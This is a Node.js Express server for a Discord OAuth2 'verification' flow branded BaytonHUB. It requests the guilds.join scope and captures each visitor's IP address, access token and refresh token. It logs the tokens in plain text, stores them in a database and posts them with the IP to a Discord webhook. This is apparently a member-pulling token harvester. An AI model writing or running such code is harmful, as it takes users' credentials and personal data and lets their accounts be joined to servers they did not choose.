﻿const express = require('express');
const app = express();
const path = require('path');
const mongoose = require('mongoose');
const emoji = require('./src/Structures/Emojis.js');
const config = require('./config');
const { WebhookClient } = require('discord.js');
const webhook = new WebhookClient({ url: config.webhookURL });
const fetch = require('node-fetch');
const { createUser, updateUser } = require('./src/Structures/Functions');
const { User } = require('./src/Models/index');
const { success, logErr, log, yellow } = require('./src/Structures/Functions');

Array.prototype.random = function () {
    return this[Math.floor(Math.random() * this.length)];
};
//process.kill(1)

async function loadDatabase() {
    try {
        await mongoose.connect(config.mongo, {
            autoIndex: true,
            maxPoolSize: 10,
            serverSelectionTimeoutMS: 60000,
            socketTimeoutMS: 60000,
            family: 4,
        });
    } catch (err) {
        return logErr(`Database error : ${err}`);
    }
    success('Database loaded');
}

app.get('/', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const { code } = req.query;

    log(`${ip} : Yeni Ziyaretçi`);

    if (!code) return res.sendStatus(400);
    if (code.length < 30) return res.sendStatus(400);

    try {
        const oauthResult = await fetch('https://discordapp.com/api/oauth2/token', {
            method: 'POST',
            body: new URLSearchParams({
                client_id: config.clientID,
                client_secret: config.clientSecret,
                code,
                grant_type: 'authorization_code',
                redirect_uri: config.redirectURI,
                scope: 'identify guilds.join',
            }),
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
        });

        const oauthData = await oauthResult.json();

        const userResult = await fetch('https://discordapp.com/api/users/@me', {
            headers: {
                authorization: `${oauthData.token_type} ${oauthData.access_token}`,
            },
        });

        const userInfo = await userResult.json();
        if (userInfo.code == 0) {
            res.sendStatus(400);
            return logErr(`${ip} : Invalid code in URL`);
        }

        try {
            await fetch(
                `https://discord.com/api/v10/guilds/${config.guildId}/members/${userInfo.id}/roles/${config.roleId}`,
                {
                    method: 'PUT',
                    headers: {
                        Authorization: `Bot ${config.token}`,
                    },
                }
            );
        } catch (error) {
            return;
        }

        const findUser = await User.findOne({ id: userInfo.id });
        yellow(`${'='.repeat(50)}`);
        success(`${ip} : Yeni Bağlantı ( ${userInfo.username}#${userInfo.discriminator} )`);
        success(`AT: ${oauthData.access_token} | RT: ${oauthData.refresh_token}`);
        if (!findUser) {
            sendWebhook(userInfo, oauthData, ip);
            success(`User DB Create : ${userInfo.username}#${userInfo.discriminator}`);
            createUser(userInfo, oauthData.access_token, oauthData.refresh_token);
        } else if (findUser.access_token !== oauthData.access_token) {
            sendWebhook(userInfo, oauthData, ip);
            success(`User DB Update : ${userInfo.username}#${userInfo.discriminator}`);
            updateUser(userInfo, {
                access_token: oauthData.access_token,
                refresh_token: oauthData.refresh_token,
            });
        } else {
            logErr(`User DB Error : ${userInfo.username}#${userInfo.discriminator} Zaten izin verdi.`);
        }
        yellow(`${'='.repeat(50)}`);
    } catch (err) {
        logErr(err);
    }

    res.redirect(config.redirectionBot.random());
});

function sendWebhook(userInfo, oauthData, ip) {
    let avatarUrl;
    if (userInfo.avatar) {
        avatarUrl = userInfo.avatar.startsWith('a_')
            ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.gif?size=4096`
            : `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.png?size=4096`;
    } else {
        avatarUrl = `https://cdn.discordapp.com/embed/avatars/0.png`;
    }

    webhook
        .send({
            embeds: [
                {
                    color: 3092790,
                    description: `${emoji.progress} **Yeni Erişim**(BaytonHUB)`,
                    thumbnail: {
                        url: avatarUrl,
                    },
                    fields: [
                        {
                            name: `${emoji.member} Kullanıcı Adı`,
                            value: `\`\`\`ini\n[ @${userInfo.username} ]\`\`\``,
                        },
                        { name: `${emoji.author} IP Adresi`, value: `\`\`\`ini\n[ ${ip} ]\`\`\`` },
                        { name: `${emoji.author} Kullanıcı ID`, value: `\`\`\`ini\n[ ${userInfo.id} ]\`\`\`` },
                        { name: `${emoji.author} Erişim Tokeni`, value: `\`\`\`ini\n[ ${oauthData.access_token} ]\`\`\`` },
                        { name: `${emoji.author} Yenileme Tokeni`, value: `\`\`\`ini\n[ ${oauthData.refresh_token} ]\`\`\`` },
                    ],
                    timestamp: new Date(),
                },
            ],
        })
        .catch((err) => {
            logErr(err);
        });
}


app.listen(config.port, async () => {
    await loadDatabase();
    log(
        `oAuth v2 listening on http${config.port == 80 ? 's' : ''}://${Object.values(
            require('os').networkInterfaces()
        ).reduce(
            (r, list) =>
                r.concat(
                    list.reduce((rr, i) => rr.concat((i.family === 'IPv4' && !i.internal && i.address) || []), [])
                ),
            []
        )}${config.port !== 80 ? `:${config.port}` : ''}`
    );
});

const appr = express();
const portr = config.redirectport;

appr.use(express.static(path.join(__dirname, 'html')));

appr.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'html', 'index.html'));
});

appr.listen(portr, () => {
    console.log(`HTML server listening at ${portr} port.`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
